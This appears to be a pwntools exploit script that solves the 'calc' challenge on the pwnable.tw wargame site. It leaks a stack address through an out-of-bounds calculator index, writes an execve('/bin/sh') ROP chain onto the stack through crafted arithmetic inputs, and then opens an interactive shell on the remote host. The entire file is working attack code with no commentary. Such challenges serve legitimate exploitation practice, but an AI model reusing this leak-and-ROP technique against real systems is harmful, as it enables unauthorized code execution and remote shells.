from pwn import *

DEBUG_MODE = False

ROP_gadget = [0x0805c34b, 0x0b, 0x080701d0, 0x0, 0x0, 0x0, 0x08049a21, u32("/bin"), u32("/sh\0")]

def setgdb(filename : str):
    p = process(filename)
    context.terminal = ["tmux", "splitw", "-h"]
    context.log_level = 'debug'
    gdb.attach(p)
    return p

if __name__ == '__main__':
    if(DEBUG_MODE):
        p = setgdb('./calc')
    else:
        p = remote("chall.pwnable.tw", 10100)

    p.recv()
    
    # leak ebp_main
    p.sendline("+360")
    leak = int(p.recv())
    ROP_gadget[5] = leak

    index = 361
    for gadget in ROP_gadget:
        # get origin value
        payload = "+" + str(index)
        p.sendline(payload)
        temp = int(p.recv())
        # set gadget, calculate the diff between origin value and gadget
        if(gadget > temp):
            temp = gadget - temp
            payload += "+" + str(temp)
        else:
            temp = temp - gadget
            payload += "-" + str(temp)
        p.sendline(payload)
        p.recv()
        index += 1
    
    p.interactive()
